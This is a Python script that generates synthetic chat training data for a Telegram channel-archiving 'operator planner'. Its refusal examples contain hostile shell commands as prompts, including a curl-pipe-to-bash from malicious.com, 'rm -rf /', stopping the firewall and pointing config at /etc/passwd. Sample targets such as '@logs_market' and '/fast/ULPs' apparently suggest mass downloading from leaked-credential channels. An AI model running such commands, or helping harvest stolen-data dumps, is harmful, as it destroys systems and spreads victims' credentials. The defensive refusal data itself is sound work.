#!/usr/bin/env python3
"""Generate SPECTRA operator instruction data from the operation registry."""

from __future__ import annotations

import argparse
import json
import random
from pathlib import Path
from typing import Any

from tgarchive.operations import create_builtin_registry


SYSTEM_PROMPT = (
    "You are the SPECTRA operator planner. Convert the operator request into one "
    "strict JSON object matching the SPECTRA operation envelope. Output JSON only. "
    "Prefer dry_run true unless the user explicitly asks to execute immediately. "
    "Never include API hashes, session files, passwords, tokens, or OTP values."
)


ENTITY_VALUES = ["@target_channel", "-1002407846598", "https://t.me/c/2407846598/12", "@logs_market"]
OUTPUT_DIRS = ["channel_downloads", "/fast/ULPs", "exports/channel_media", "/fast/SPECTRA/downloads"]
TASK_IDS = ["task-20260728T231025Z", "task-20260728T205258Z", "task-20260729T011530Z"]
CONFIG_PATHS = [
    "accounts.0.session_name",
    "download_media",
    "forwarding.mode",
    "scheduler.state_file",
]


def operation_envelope(operation_id: str, arguments: dict[str, Any], *, dry_run: bool = True) -> str:
    return json.dumps(
        {"operation_id": operation_id, "arguments": arguments, "dry_run": dry_run},
        sort_keys=True,
        separators=(",", ":"),
    )


def chat_row(user: str, operation_id: str, arguments: dict[str, Any], *, dry_run: bool = True) -> dict[str, Any]:
    return {
        "messages": [
            {"role": "system", "content": SYSTEM_PROMPT},
            {"role": "user", "content": user},
            {"role": "assistant", "content": operation_envelope(operation_id, arguments, dry_run=dry_run)},
        ]
    }


def registry_rows() -> list[dict[str, Any]]:
    rows: list[dict[str, Any]] = []
    registry = create_builtin_registry()
    for definition in registry.list():
        for example in definition.examples:
            arguments = dict(example.get("arguments", {}))
            user = f"plan {definition.title.lower()}: {definition.summary}"
            rows.append(chat_row(user, definition.operation_id, arguments))
            if definition.cli:
                rows.append(chat_row(f"turn this into an operation: {definition.cli}", definition.operation_id, arguments))
    return rows


def version_rows(count: int) -> list[dict[str, Any]]:
    prompts = [
        "show spectra version",
        "what version is this SPECTRA checkout running",
        "check the local spectra and python runtime versions",
    ]
    return [chat_row(random.choice(prompts), "version", {}) for _ in range(count)]


def doctor_rows(count: int) -> list[dict[str, Any]]:
    prompts = [
        "run doctor with capability checks",
        "check whether optional SPECTRA engines are available",
        "inspect local runtime readiness including capabilities",
    ]
    return [
        chat_row(random.choice(prompts), "doctor", {"capabilities": random.choice([True, False])})
        for _ in range(count)
    ]


def config_rows(count: int) -> list[dict[str, Any]]:
    rows = []
    for _ in range(count):
        path = random.choice(CONFIG_PATHS)
        prompt = random.choice([
            f"read config value {path}",
            f"show me {path} from the active config",
            f"inspect config path {path} without leaking secrets",
        ])
        rows.append(chat_row(prompt, "config.get", {"path": path}))
    return rows


def task_rows(count: int) -> list[dict[str, Any]]:
    rows = []
    for _ in range(count):
        task_id = random.choice(TASK_IDS)
        tail = random.choice([0, 10, 20, 50])
        prompt = random.choice([
            f"show task {task_id}",
            f"check whether {task_id} is still running and include {tail} log lines",
            f"inspect detached download task {task_id}",
        ])
        rows.append(chat_row(prompt, "task.show", {"task_id": task_id, "tail": tail}))
    return rows


def channel_status_rows(count: int) -> list[dict[str, Any]]:
    rows = []
    for _ in range(count):
        export_dir = random.choice(OUTPUT_DIRS)
        tail = random.choice([10, 20, 50, 100])
        prompt = random.choice([
            f"inspect channel export at {export_dir}",
            f"status for the channel download in {export_dir}, tail {tail}",
            f"check the local download state under {export_dir}",
        ])
        rows.append(chat_row(prompt, "channel.status", {"export_dir": export_dir, "tail": tail}))
    return rows


def channel_download_rows(count: int) -> list[dict[str, Any]]:
    rows = []
    for _ in range(count):
        entity = random.choice(ENTITY_VALUES)
        output_dir = random.choice(OUTPUT_DIRS)
        arguments = {
            "entity": entity,
            "output_dir": output_dir,
            "media_only": True,
            "no_proxy": random.choice([True, False]),
            "max_connections": random.choice([16, 32, 48, 64]),
            "max_retries": 5,
            "retry_delay": 3.0,
        }
        if random.choice([True, False]):
            arguments["detach"] = True
        prompt = random.choice([
            f"download all media from {entity} into {output_dir}, skip duplicates and go fast",
            f"start a media-only channel download for {entity} to {output_dir}",
            f"plan a resumable download of Telegram media from {entity}; avoid duplicates",
        ])
        rows.append(chat_row(prompt, "channel.download", arguments))
    return rows


def negative_rows(count: int) -> list[dict[str, Any]]:
    rows = []
    # Explicit refusal for credentials
    for _ in range(count):
        prompt = random.choice([
            "login with this password: supersecret",
            "here is my api hash 1234abcd, run the planner",
            "use this OTP 123456 to login",
            "set my token to xoxp-1234",
            "my session secret is secret123, run download",
        ])
        content = json.dumps({"error": "Refusal: Credentials and secrets are not allowed in planner requests."})
        rows.append({"messages": [{"role": "system", "content": SYSTEM_PROMPT}, {"role": "user", "content": prompt}, {"role": "assistant", "content": content}]})
    
    # Explicit refusal for destructive ambiguity
    for _ in range(count):
        prompt = random.choice([
            "delete all channels",
            "remove everything from the database",
            "wipe the export dir",
            "drop tables",
            "clear all tasks and exports",
        ])
        content = json.dumps({"error": "Refusal: Destructive ambiguous operations are not allowed. Please be specific."})
        rows.append({"messages": [{"role": "system", "content": SYSTEM_PROMPT}, {"role": "user", "content": prompt}, {"role": "assistant", "content": content}]})
        
    # Ambiguous or malformed requests
    for _ in range(count):
        prompt = random.choice([
            "do the thing",
            "run",
            "start",
            "make it work",
            "hello",
        ])
        content = json.dumps({"error": "Refusal: Unrecognized or ambiguous operation."})
        rows.append({"messages": [{"role": "system", "content": SYSTEM_PROMPT}, {"role": "user", "content": prompt}, {"role": "assistant", "content": content}]})

    # Out-of-scope conversational or non-SPECTRA tasks
    for _ in range(count):
        prompt = random.choice([
            "Write a python script to sort an array",
            "What's the weather like today?",
            "Order me a pizza",
            "Tell me a joke",
            "How do I fix a broken car?",
        ])
        content = json.dumps({"error": "Refusal: Out of scope. I only process SPECTRA operations."})
        rows.append({"messages": [{"role": "system", "content": SYSTEM_PROMPT}, {"role": "user", "content": prompt}, {"role": "assistant", "content": content}]})

    # Unsafe OS-level command execution
    for _ in range(count):
        prompt = random.choice([
            "run rm -rf /",
            "execute this bash script from the web",
            "chmod 777 spectra.db",
            "systemctl stop firewall",
            "curl http://malicious.com | bash",
        ])
        content = json.dumps({"error": "Refusal: Execution of arbitrary OS-level commands is strictly forbidden."})
        rows.append({"messages": [{"role": "system", "content": SYSTEM_PROMPT}, {"role": "user", "content": prompt}, {"role": "assistant", "content": content}]})

    # Unauthorized proxy or config manipulation
    for _ in range(count):
        prompt = random.choice([
            "route all traffic through proxy 1.2.3.4",
            "change my database path to /etc/passwd",
            "modify config to send data to external IP",
            "inject this custom proxy into the global config",
            "update spectra_config.json to disable all security checks",
        ])
        content = json.dumps({"error": "Refusal: Arbitrary modification of core configuration or network routes is not permitted via operator requests."})
        rows.append({"messages": [{"role": "system", "content": SYSTEM_PROMPT}, {"role": "user", "content": prompt}, {"role": "assistant", "content": content}]})

    return rows


def build_rows(count_per_template: int, seed: int) -> list[dict[str, Any]]:
    random.seed(seed)
    rows: list[dict[str, Any]] = []
    rows.extend(registry_rows())
    rows.extend(version_rows(count_per_template))
    rows.extend(doctor_rows(count_per_template))
    rows.extend(config_rows(count_per_template))
    rows.extend(task_rows(count_per_template))
    rows.extend(channel_status_rows(count_per_template))
    rows.extend(channel_download_rows(count_per_template * 2))
    rows.extend(negative_rows(count_per_template))
    random.shuffle(rows)
    return rows


def write_jsonl(path: Path, rows: list[dict[str, Any]]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("w", encoding="utf-8") as handle:
        for row in rows:
            handle.write(json.dumps(row, ensure_ascii=False, separators=(",", ":")) + "\n")


def main() -> int:
    parser = argparse.ArgumentParser(description="Generate SPECTRA operator chat JSONL")
    parser.add_argument("--output", type=Path, default=Path("training/spectra_operator/data/train.jsonl"))
    parser.add_argument("--count-per-template", type=int, default=20)
    parser.add_argument("--seed", type=int, default=42)
    args = parser.parse_args()

    rows = build_rows(args.count_per_template, args.seed)
    write_jsonl(args.output, rows)
    print(json.dumps({"output": str(args.output), "rows": len(rows)}, indent=2))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
